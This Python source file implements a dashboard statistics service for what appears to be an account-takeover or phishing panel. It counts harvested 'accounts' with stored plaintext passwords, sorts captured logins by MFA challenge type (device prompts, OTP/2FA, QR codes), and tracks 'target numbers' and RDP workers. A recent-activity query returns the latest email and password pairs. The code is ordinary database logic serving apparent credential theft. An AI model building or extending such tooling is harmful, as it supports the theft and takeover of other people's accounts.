import aiosqlite
from typing import Dict, Any

class StatsService:
    @staticmethod
    async def get_dashboard_stats(db: aiosqlite.Connection) -> Dict[str, Any]:
        # 1. Overview counts
        async with db.execute("SELECT COUNT(*) as total FROM accounts") as c_master:
            r_master = await c_master.fetchone()
            master_total = r_master["total"] if r_master else 0

        async with db.execute("SELECT COUNT(*) as total FROM accounts_trade") as c_trade:
            r_trade = await c_trade.fetchone()
            trade_total = r_trade["total"] if r_trade else 0

        async with db.execute("SELECT COUNT(*) as total FROM accounts WHERE date(timestamp) = date('now')") as c_today:
            r_today = await c_today.fetchone()
            today_received = r_today["total"] if r_today else 0

        async with db.execute("SELECT COUNT(*) as total FROM accounts WHERE date(timestamp) = date('now', '-1 day')") as c_yest:
            r_yest = await c_yest.fetchone()
            yesterday_received = r_yest["total"] if r_yest else 0

        # Category breakdowns from accounts_trade status
        status_counts = {}
        async with db.execute("SELECT status, COUNT(*) as cnt FROM accounts_trade GROUP BY status") as c_st:
            rows = await c_st.fetchall()
            for r in rows:
                status_counts[str(r["status"]).lower().strip()] = r["cnt"]

        def count_for_statuses(aliases):
            return sum(status_counts.get(a.lower(), 0) for a in aliases)

        count_dp = count_for_statuses(['dp', 'tap yes (dp)', 'challenge/dp'])
        count_ipp_consent = count_for_statuses(['ipp/consent', 'challenge/ipp/consent', 'device consent (ipp)'])
        count_verif_num = count_for_statuses(['verification number', 'verification needed', 'insert_number'])
        count_selection = count_for_statuses(['selection', 'method select (selection)', 'challenge/selection'])
        count_ipp_collect = count_for_statuses(['ipp/collect', 'identity collect (collect)'])
        count_ipp_qrcode = count_for_statuses(['ipp/qrcode', 'qr code scan (qrcode)', 'challenge/ipp/qrcode'])
        count_iap = count_for_statuses(['iap', 'app prompt (iap)'])
        count_otp = count_for_statuses(['otp', 'ootp', 'push app (ootp)', 'passkey otp (skotp)', '2fa_tap_prompt'])

        # Admin vs Client completed accounts
        async with db.execute(
            "SELECT u.role, COUNT(*) as cnt FROM accounts_trade a JOIN users u ON a.user_id = u.id WHERE a.row_focus = 'mail' GROUP BY u.role"
        ) as c_roles:
            role_rows = await c_roles.fetchall()
            trade_role_map = {dict(r)["role"]: dict(r)["cnt"] for r in role_rows}

        count_completed_admin = trade_role_map.get("admin", 0)
        count_completed_client = trade_role_map.get("client", 0)

        async with db.execute(
            "SELECT u.role, COUNT(*) as cnt FROM accounts a JOIN users u ON a.user_id = u.id WHERE a.row_focus = 'mail' GROUP BY u.role"
        ) as c_mroles:
            mrole_rows = await c_mroles.fetchall()
            master_role_map = {dict(r)["role"]: dict(r)["cnt"] for r in mrole_rows}

        count_master_admin = master_role_map.get("admin", 0)
        count_master_client = master_role_map.get("client", 0)

        # Target numbers breakdown
        async with db.execute(
            """
            SELECT
                SUM(CASE WHEN status = 'running' THEN 1 ELSE 0 END) AS count_running,
                SUM(CASE WHEN status = 'completed' THEN 1 ELSE 0 END) AS count_completed,
                SUM(CASE WHEN status = 'failed' THEN 1 ELSE 0 END) AS count_failed,
                SUM(CASE WHEN status = 'verify' THEN 1 ELSE 0 END) AS count_verify,
                SUM(CASE WHEN status = 'inactive' THEN 1 ELSE 0 END) AS count_inactive,
                COUNT(*) AS count_total
            FROM target_numbers
            """
        ) as c_tgt:
            tgt_row = dict(await c_tgt.fetchone() or {})

        tgt_total = tgt_row.get("count_total") or 0
        tgt_running = tgt_row.get("count_running") or 0
        tgt_completed = tgt_row.get("count_completed") or 0
        tgt_failed = tgt_row.get("count_failed") or 0
        tgt_verify = tgt_row.get("count_verify") or 0
        tgt_inactive = tgt_row.get("count_inactive") or 0

        # Users counts
        async with db.execute("SELECT role, COUNT(*) as cnt FROM users GROUP BY role") as c_u:
            u_rows = await c_u.fetchall()
            users_map = {"client": 0, "admin": 0, "total": 0}
            for r in u_rows:
                role_name = r["role"]
                cnt = r["cnt"]
                users_map[role_name] = cnt
                users_map["total"] += cnt

        # Recent 10 master accounts
        async with db.execute(
            """
            SELECT a.id, a.email, a.password, a.status, a.row_focus, a.timestamp, coalesce(u.username, 'admin') as username, a.full_data
            FROM accounts a
            LEFT JOIN users u ON a.user_id = u.id
            ORDER BY a.id DESC
            LIMIT 10
            """
        ) as cursor:
            recent_rows = await cursor.fetchall()
            recent_activity = [dict(row) for row in recent_rows]

        return {
            "success": True,
            "data": {
                "overview": {
                    "master_total": master_total,
                    "trade_total": trade_total,
                    "today_received": today_received,
                    "yesterday_received": yesterday_received,
                    "running_rdp_workers": tgt_running,
                    "admin_mail_24h": count_completed_admin,
                    "admin_master_total": count_master_admin,
                    "client_mail_24h": count_completed_client,
                    "client_master_total": count_master_client,
                    "numbers_24h_received": count_verif_num,
                    "users": users_map
                },
                "categories": {
                    "completed_admin": {
                        "id": "completed_admin",
                        "title": "Admin Recovered (Live)",
                        "count": count_completed_admin,
                        "badge": "ADMIN LIVE POOL",
                        "color": "purple"
                    },
                    "completed_all_admin": {
                        "id": "completed_all_admin",
                        "title": "All Admin Accounts",
                        "count": count_master_admin,
                        "badge": "ADMIN MASTER VAULT",
                        "color": "indigo"
                    },
                    "completed_client": {
                        "id": "completed_client",
                        "title": "Client Recovered Accounts",
                        "count": count_completed_client,
                        "badge": "CLIENT RECOVERED",
                        "color": "emerald"
                    },
                    "dp": {
                        "id": "dp",
                        "title": "Device Prompts (DP)",
                        "count": count_dp,
                        "badge": "DP PROMPT",
                        "color": "purple"
                    },
                    "ipp_consent": {
                        "id": "ipp_consent",
                        "title": "IPP Consent Challenges",
                        "count": count_ipp_consent,
                        "badge": "CONSENT",
                        "color": "indigo"
                    },
                    "selection": {
                        "id": "selection",
                        "title": "Selection Challenges",
                        "count": count_selection,
                        "badge": "SELECTION",
                        "color": "cyan"
                    },
                    "ipp_collect": {
                        "id": "ipp_collect",
                        "title": "IPP Collect Prompts",
                        "count": count_ipp_collect,
                        "badge": "IPP COLLECT",
                        "color": "sky"
                    },
                    "ipp_qrcode": {
                        "id": "ipp_qrcode",
                        "title": "IPP QR Code Prompts",
                        "count": count_ipp_qrcode,
                        "badge": "QR CODE",
                        "color": "teal"
                    },
                    "iap": {
                        "id": "iap",
                        "title": "IAP / App Prompts",
                        "count": count_iap,
                        "badge": "IAP APP",
                        "color": "pink"
                    },
                    "otp": {
                        "id": "otp",
                        "title": "OTP / 2FA Prompts",
                        "count": count_otp,
                        "badge": "OTP / 2FA",
                        "color": "rose"
                    },
                    "target_pool": {
                        "id": "target_pool",
                        "title": "Target Numbers Dispatch Pool",
                        "count": tgt_total,
                        "badge": "POOL 24/7",
                        "color": "blue"
                    }
                },
                "target_numbers_pool": {
                    "total": tgt_total,
                    "running": tgt_running,
                    "completed": tgt_completed,
                    "failed": tgt_failed,
                    "verify": tgt_verify,
                    "inactive": tgt_inactive
                },
                "recent_activity": recent_activity
            }
        }
